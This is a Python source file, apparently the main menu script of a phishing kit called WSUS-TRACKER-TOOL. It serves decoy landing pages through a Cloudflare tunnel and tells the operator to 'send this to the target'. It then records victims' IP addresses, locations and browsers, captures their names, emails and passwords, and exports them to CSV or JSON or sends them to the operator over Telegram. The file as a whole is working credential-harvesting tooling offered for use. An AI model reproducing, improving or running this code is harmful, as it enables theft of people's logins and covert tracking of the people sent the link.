#!/usr/bin/env python3
"""WSUS-TRACKER-TOOL — terminal panel entry point."""
import os
import sys
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core import banner, config as C, server, tunnel
from core.dashboard import print_creds, print_new, render_session
from core.store import Store
from core.utils import C as Col, bell, box, cls, copy, die, enable_ansi, qr, rule, ts

enable_ansi()


def on_update(kind, s, extra):
    cfg = STATE["cfg"]
    if kind == "new":
        print_new(s)
        if cfg.get("sound"):
            bell()
        _notify(cfg, s)
        _maybe_autostop(cfg)
    elif kind == "creds":
        print_creds(s, extra)
        if cfg.get("sound"):
            bell()
            bell()


def _notify(cfg, s):
    tok, chat = cfg.get("telegram_token"), cfg.get("telegram_chat")
    if not (tok and chat):
        return
    import json
    import urllib.parse
    import urllib.request
    g = s.get("geo") or {}
    txt = (f"NEW HIT\n{s.get('ip')}\n{g.get('city','')}, {g.get('country','')}\n"
           f"{s.get('os')} / {s.get('browser')}\n{s.get('first_seen')}")
    url = f"https://api.telegram.org/bot{tok}/sendMessage"
    data = urllib.parse.urlencode({"chat_id": chat, "text": txt}).encode()
    try:
        urllib.request.urlopen(url, data, timeout=6)
    except Exception:
        pass


def _maybe_autostop(cfg):
    limit = cfg.get("max_hits") or 0
    if limit and STATE["store"].hit_count >= limit:
        print(f"\n{Col.YEL}  auto-stop: {limit} hits reached.{Col.R}")
        stop_all()


STATE = {"cfg": None, "store": None, "tun": None, "app": None, "running": False}


def start_all():
    cfg = STATE["cfg"]
    if STATE["running"]:
        print(f"  {Col.YEL}already running.{Col.R}")
        return
    STATE["store"].reset()
    STATE["store"].on_update = on_update
    STATE["app"], _ = server.serve(cfg, STATE["store"], log=print)
    STATE["running"] = True
    tun = tunnel.Tunnel(cfg["port"], on_url=on_link, log=print)
    STATE["tun"] = tun
    print(f"  {Col.GRY}opening cloudflare quick tunnel…{Col.R}")
    tun.start()
    if cfg.get("timeout_min"):
        t = cfg["timeout_min"] * 60
        threading.Timer(t, lambda: (print(f"\n{Col.YEL}  auto-stop: timeout.{Col.R}"), stop_all())).start()


def stop_all():
    if STATE["tun"]:
        STATE["tun"].stop()
        STATE["tun"] = None
    STATE["running"] = False
    print(f"  {Col.GRY}tunnel closed.{Col.R}")


def on_link(url):
    cfg = STATE["cfg"]
    print()
    box([f"{Col.B}{Col.WHT}{url}{Col.R}"], color=Col.GRN, title="PUBLIC LINK")
    if cfg.get("clipboard") and copy(url):
        print(f"  {Col.GRY}link copied to clipboard.{Col.R}")
    print(f"  {Col.GRY}theme: {cfg['theme']} · send this to the target.{Col.R}\n")


def menu():
    cfg = STATE["cfg"]
    print(f"{Col.B}  [1]{Col.R} start tunnel        {Col.B}[2]{Col.R} theme ({Col.YEL}{cfg['theme']}{Col.R})")
    print(f"{Col.B}  [3]{Col.R} show link + QR      {Col.B}[4]{Col.R} live sessions")
    print(f"{Col.B}  [5]{Col.R} captured creds      {Col.B}[6]{Col.R} export (csv/json)")
    print(f"{Col.B}  [7]{Col.R} web dashboard       {Col.B}[8]{Col.R} settings")
    print(f"{Col.B}  [9]{Col.R} credits / about     {Col.B}[0]{Col.R} exit")
    print()


def pick_theme():
    cfg = STATE["cfg"]
    print()
    for k, (tid, label) in C.THEMES.items():
        print(f"  {Col.B}[{k}]{Col.R} {label}")
    print()
    ch = input(f"  {Col.CYN}choose › {Col.R}").strip()
    if ch in C.THEMES:
        cfg["theme"] = C.THEMES[ch][0]
        C.save(cfg)
        print(f"  {Col.GRN}theme → {cfg['theme']}{Col.R}")


def show_link():
    if not (STATE["tun"] and STATE["tun"].url):
        print(f"  {Col.YEL}no active link — press 1 first.{Col.R}")
        return
    url = STATE["tun"].url
    print()
    box([url], color=Col.GRN, title="PUBLIC LINK")
    qr(url)


def live():
    store = STATE["store"]
    if not store.all():
        print(f"  {Col.GRY}no sessions yet.{Col.R}")
        return
    for s in store.all()[:10]:
        render_session(s)
        print()


def creds():
    store = STATE["store"]
    rows = [(s, c) for s in store.all() for c in s.get("creds", [])]
    if not rows:
        print(f"  {Col.GRY}no credentials yet.{Col.R}")
        return
    for s, c in rows:
        print(f"  {c['t'][11:19]}  {s.get('ip')}  {Col.B}{c.get('name')}{Col.R} / "
              f"{c.get('email')} / {Col.YEL}{c.get('password')}{Col.R}")


def export():
    store = STATE["store"]
    if not store.all():
        print(f"  {Col.GRY}nothing to export.{Col.R}")
        return
    print(f"  {Col.GRN}csv  → {store.to_csv()}{Col.R}")
    print(f"  {Col.GRN}json → {store.to_json()}{Col.R}")


def dashboard():
    if not STATE["app"]:
        print(f"  {Col.YEL}start the server first (1).{Col.R}")
        return
    print(f"  http://127.0.0.1:{STATE['cfg']['port']}/panel?k="
          f"{STATE['app'].config['DASH_TOKEN']}")


def settings():
    cfg = STATE["cfg"]
    print()
    print(f"  1) redirect url      {Col.GRY}{cfg['redirect']}{Col.R}")
    print(f"  2) port              {cfg['port']}")
    print(f"  3) sound alert       {'on' if cfg['sound'] else 'off'}")
    print(f"  4) copy link         {'on' if cfg['clipboard'] else 'off'}")
    print(f"  5) geo lookup        {'on' if cfg['geo'] else 'off'}")
    print(f"  6) auto-stop hits    {cfg['max_hits'] or 'off'}")
    print(f"  7) auto-stop minutes {cfg['timeout_min'] or 'off'}")
    print(f"  8) telegram token    {'set' if cfg['telegram_token'] else '—'}")
    print(f"  9) telegram chat id  {cfg['telegram_chat'] or '—'}")
    print(f"  0) back")
    ch = input(f"\n  {Col.CYN}setting › {Col.R}").strip()
    if ch == "1":
        cfg["redirect"] = input("  new redirect url › ").strip() or cfg["redirect"]
    elif ch == "2":
        try:
            cfg["port"] = int(input("  port › ").strip())
        except ValueError:
            pass
    elif ch in ("3", "4", "5"):
        key = {"3": "sound", "4": "clipboard", "5": "geo"}[ch]
        cfg[key] = not cfg[key]
    elif ch == "6":
        cfg["max_hits"] = int(input("  stop after N hits (0 = off) › ").strip() or 0)
    elif ch == "7":
        cfg["timeout_min"] = int(input("  stop after N minutes (0 = off) › ").strip() or 0)
    elif ch == "8":
        cfg["telegram_token"] = input("  bot token › ").strip()
    elif ch == "9":
        cfg["telegram_chat"] = input("  chat id › ").strip()
    C.save(cfg)


def about():
    print()
    box([
        f"{Col.B}WSUS-TRACKER-TOOL{Col.R} v1.0.0",
        "",
        "A terminal-driven browser detail tracker with",
        "believable decoy landing pages.",
        "",
        f"{Col.B}credits{Col.R}  whitiger — build & concept",
        f"{Col.B}author{Col.R}   whitigergaming-design",
        f"{Col.B}repo{Col.R}     github.com/whitigergaming-design/WSUS-TRACKER-TOOL",
        "",
        f"{Col.D}Not responsible for anything.{Col.R}",
    ], color=Col.MAG)


def main():
    C.ensure()
    cfg = C.load()
    STATE["cfg"] = cfg
    STATE["store"] = Store(cfg)

    try:
        cls()
        banner.show("1.0.0", cfg["theme"], cfg["redirect"])
        menu()
        while True:
            try:
                ch = input(f"  {Col.CYN}wsus › {Col.R}").strip()
            except EOFError:
                break
            if ch == "1":
                start_all()
            elif ch == "2":
                pick_theme()
            elif ch == "3":
                show_link()
            elif ch == "4":
                live()
            elif ch == "5":
                creds()
            elif ch == "6":
                export()
            elif ch == "7":
                dashboard()
            elif ch == "8":
                settings()
            elif ch == "9":
                about()
            elif ch == "0":
                break
            print()
            menu()
    except KeyboardInterrupt:
        pass
    finally:
        stop_all()
        print(f"\n  {Col.GRY}bye — {STATE['store'].hit_count} session(s) captured.{Col.R}\n")


if __name__ == "__main__":
    main()
